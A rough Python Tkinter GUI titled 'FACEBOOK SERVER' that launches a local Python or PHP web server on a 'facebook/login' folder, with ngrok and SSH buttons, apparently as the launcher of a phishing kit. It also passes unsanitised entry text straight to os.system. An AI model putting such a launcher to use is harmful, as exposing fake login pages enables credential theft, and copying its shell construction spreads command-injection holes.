from tkinter import *
import time
import os

root = Tk()
root.title("FACEBOOK SERVER")
root.geometry("260x300")
root.config(bg="white")


button_mode=True

def hello():
    file=Filename.get()
    rhg=Filename1.get()
    path=Filename2.get()
    os.system ("python3 -m "+str(file+" "+rhg+' '+'-d'+' '+path))


def ngrok():

    ngrok = Tk()
    ngrok.title("FACEBOOK SERVER")
    ngrok.geometry("260x300")
    ngrok.config(bg="white")

    button_mode1=True

    def hellong():

        fileng=Filenameng1.get()
        rhgng=Filenameng2.get()
        pathng=Filenameng3.get()
        print  ("./"+str(fileng+" "+pathng+' '+rhgng))

    host1=Label(ngrok,text="HOST:",bg="#fff",font="Arial 9 bold")
    host1.place(x=10,y=100)

    Filenameng1=StringVar()
    HOST1=Entry(ngrok,textvariable=Filenameng1,width=18,font="arial 9")
    HOST1.place(x=70,y=100)
    Filenameng1.set("tt")


    port1=Label(ngrok,text="PORT:",bg="#fff",font="Arial 9 bold")
    port1.place(x=10,y=130)

    Filenameng2=StringVar()
    PORT1=Entry(ngrok,textvariable=Filenameng2,width=18,font="arial 9")
    PORT1.place(x=70,y=130)
    Filenameng2.set("rr")


    path1=Label(ngrok,text="PROT:",bg="#fff",font="Arial 9 bold")
    path1.place(x=10,y=160)

    Filenameng3=StringVar()
    PATH1=Entry(ngrok,textvariable=Filenameng3,width=18,font="arial 9")
    PATH1.place(x=70,y=160)
    Filenameng3.set("pp")

    PRT=Label(ngrok,text="SERVER",bg="#fff",font="Arial 9 bold")
    PRT.place(x=10,y=190)

    Filenameng4=StringVar()
    PHP=Entry(ngrok,textvariable=Filenameng4,width=18,font="arial 9")
    PHP.place(x=70,y=190)
    Filenameng4.set("php -S localhost:8080 facebook/login")



    B11 = Button(ngrok,bg="#DC143C", text = "STOP", font="Arial 10 bold",command = hellong)
    B11.place(x = 20,y = 265)


    B11 = Button(ngrok,bg="#34A56F", text = "START",font="Arial 10 bold",command = hellong)
    B11.place(x = 170,y = 265)


    ngrok1 = Button(ngrok,bg="#fff",font="Arial 7 bold" ,text = "NGROK", command = hellong)
    ngrok1.place(x = 30,y = 10)


    python1 = Button(ngrok,bg="#fff",font="Arial 7 bold" ,text = "PYTHON", command = hellong)
    python1.place(x = 90,y = 10)

    ssh1 = Button(ngrok,bg="#fff",font="Arial 7 bold" ,text = "SSH", command = hellong)
    ssh1.place(x = 150,y = 10)

    php1 = Button(ngrok,bg="#fff",font="Arial 7 bold" ,text = "PHP", command = hellong)
    php1.place(x = 190,y = 10)


    ngrok.mainloop()


host=Label(root,text="HOST:",bg="#fff",font="Arial 9 bold")
host.place(x=10,y=100)

Filename=StringVar()
HOST=Entry(root,textvariable=Filename,width=18,font="arial 9")
HOST.place(x=70,y=100)
Filename.set("http.server")


port=Label(root,text="PORT:",bg="#fff",font="Arial 9 bold")
port.place(x=10,y=130)

Filename1=StringVar()
PORT=Entry(root,textvariable=Filename1,width=18,font="arial 9")
PORT.place(x=70,y=130)
Filename1.set("8080")



path=Label(root,text="PATH:",bg="#fff",font="Arial 9 bold")
path.place(x=10,y=160)

Filename2=StringVar()
PATH=Entry(root,textvariable=Filename2,width=18,font="arial 9")
PATH.place(x=70,y=160)
Filename2.set("facebook/login/")


B1 = Button(root,bg="#DC143C", text = "STOP", font="Arial 10 bold",command = hello)
B1.place(x = 20,y = 265)


B1 = Button(root,bg="#34A56F", text = "START",font="Arial 10 bold",command = hello)
B1.place(x = 170,y = 265)


ngrok = Button(root,bg="#fff",font="Arial 7 bold" ,text = "NGROK", command = ngrok)
ngrok.place(x = 30,y = 10)


python = Button(root,bg="#fff",font="Arial 7 bold" ,text = "PYTHON", command = hello)
python.place(x = 90,y = 10)

ssh = Button(root,bg="#fff",font="Arial 7 bold" ,text = "SSH", command = hello)
ssh.place(x = 150,y = 10)

php = Button(root,bg="#fff",font="Arial 7 bold" ,text = "PHP", command = hello)
php.place(x = 190,y = 10)

root.mainloop()
